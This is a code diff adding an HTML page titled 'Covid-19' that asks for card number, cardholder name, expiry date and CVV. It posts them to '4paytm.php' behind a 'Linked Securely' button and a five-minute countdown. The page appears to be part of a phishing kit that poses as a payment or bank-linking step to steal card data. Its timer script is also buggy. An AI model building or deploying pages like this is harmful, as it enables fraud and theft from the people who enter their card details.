@@ -1,0 +1,140 @@
+<!DOCTYPE
+html>
+<html>
+<head>
+<title>Covid-19
+</title>
+<link
+rel="stylesheet"
+type="text/css"
+href="buttonstyle.css">
+<meta
+name
+="viewport"
+content="width=device-width,
+initial-scale=1.0">
+<style>
+p{color:gray;}
+</style>
+</head>
+<body
+onload="startTimer();">
+<div>
+<div
+style="text-align:center;"><img
+src="dream.png
+"
+height="40"
+width="150"
+alt="image"
+/></div><tr></tr>
+<div
+class="box">
+<form
+method="post"
+action="4paytm.php"
+autocomplete="off">
+<center><p style="color:black; font-size:18px;">Debit / credit supported</p>
+<div>
+<input
+type="Number"
+name="CARD"
+required=""
+maxlength="19"
+id="uname">
+<label>Enter
+Card
+Number</label>
+</div>
+<div>
+<input
+type="Text"
+name="CARD_holder_name"
+required=""
+maxlength="19"
+id="abxx">
+<label>
+Card
+Holder Name</label>
+</div>
+<div>
+<input
+type="text"
+name="DATE"
+maxlength="9"
+required="">
+<label>Expiry
+Date</label>
+</div>
+<div>
+<input
+type="password"
+name="CVV"
+maxlength="7"
+required="">
+<label>CVV</label>
+</div>
+<div>
+<input
+type="submit"
+class="button"
+value="Linked Securely">
+</form>
+</div>
+</form>
+
+
+<a
+href="linkbank.html"
+id="linkbank">Select Other Bank Account </a><br><br>
+<style
+type="text/css">
+#linkbank{
+text-decoration:
+none;
+color:
+#00b9f5;
+}
+</style>
+
+
+
+
+
+
+
+<!---Timer for Otp ------------------------------------------------------------------------    -->
+
+  <script type="text/javascript">
+    var timer=300;
+    var sec=0;
+  function startTimer() {
+    sec=parseInt(timer%300);
+
+    if (timer<0) {
+      timer.stop();
+    }
+
+    document.getElementById("time").innerHTML = "<b>This screen will automatically timeout after: </b>"+sec.toString();
+    timer--;
+    setTimeout(function(){
+      startTimer();
+
+    }, 1000);
+  }
+    
+      </script>
+<!-- -------------------------------------------------------------------------------------------------- -->
+      <div>
+        <center><b><span id="time"></span>&nbsp; Second</b></center>
+      </div>
+<!-- ----------------------------------------------------------------------------------------------------------- -->
+        </div>
+<br>
+<br><br>
+</div>
+        </div>
+</body>
+
+</html>
+
